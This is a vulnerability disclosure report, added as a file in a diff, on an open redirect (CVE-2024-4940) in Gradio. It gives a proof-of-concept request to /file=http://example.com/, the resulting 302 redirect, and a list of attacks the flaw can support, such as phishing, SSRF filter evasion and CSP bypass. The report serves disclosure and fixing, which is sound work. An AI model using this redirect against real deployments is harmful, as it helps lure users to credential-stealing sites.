@@ -1,0 +1,56 @@
+Title: Open redirect in gradio-app/gradio
+
+Proof of Concept: 
+Request
+
+GET /file=http://example.com/ HTTP/1.1
+Host: 127.0.0.1:7860
+sec-ch-ua: 
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: ""
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: _ga_R1FN4KJKJH=GS1.1.1714449150.1.0.1714449150.0.0.0; _ga=GA1.1.1782003519.1714449150; _gid=GA1.1.348740570.1714449150
+Connection: close
+
+Response:
+
+HTTP/1.1 302 Found
+date: Tue, 30 Apr 2024 05:14:13 GMT
+server: uvicorn
+content-length: 0
+location: http://example.com/
+Connection: close
+
+Impact: 
+Phishing: The most obvious way to use an open redirect is to steer the victim away from the original site to a site that looks the same, steal user credentials, and then return to the vulnerable website as if nothing happened.
+Cross-site Scripting (XSS): If the redirect allows the use of data: or javascript: protocols and the client supports such protocols in redirects, it makes it possible for the attacker to perform an XSS attack.
+Server-Side Request Forgery (SSRF): Open redirects may be used to evade SSRF filters.
+Content-Security-Policy bypassing: If you use CSP to protect against XSS and one of the whitelisted domains has an open redirect, this vulnerability may be used to bypass CSP.
+CRLF Injection: If the redirection parameter allows line breaks, the attacker may try to perform response header splitting.
+
+CVE ID: CVE-2024-4940
+Status: (published)
+Vulnerability Type: https://cwe.mitre.org/data/definitions/601.html
+Severity: Medium (5.4)
+Attack Vector: Network
+Attack Complexity: Low
+Privileges Required: None
+User Interaction: Required
+Scope: Unchanged
+Confidentiality: Low
+Integrity: Low
+Availability: None
+Registry: Pypi
+Affected Version: Latest
+Visibility: Public
+Status: Awaiting fix
+Disclosure Bounty: $125
+Fix Bounty: $31.25
